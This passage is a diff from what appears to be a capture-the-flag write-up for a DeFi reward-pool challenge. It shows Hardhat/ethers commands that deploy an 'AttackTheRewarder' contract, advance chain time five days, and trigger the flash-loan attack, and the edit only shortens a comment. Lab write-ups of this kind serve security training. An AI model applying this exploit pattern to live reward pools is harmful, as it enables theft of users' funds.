@@ -379,7 +379,7 @@ Here are attacker commands:
 ```js
 const AttackFactory = await ethers.getContractFactory('AttackTheRewarder', deployer);
 attack = await AttackFactory.deploy(rewarderPool.address,rewardToken.address,flashLoanPool.address,liquidityToken.address);
-await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // Simulate attacker waiting 5 days for the next distribution
+await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
 await attack.connect(player).attack(TOKENS_IN_LENDER_POOL);
 ```
 
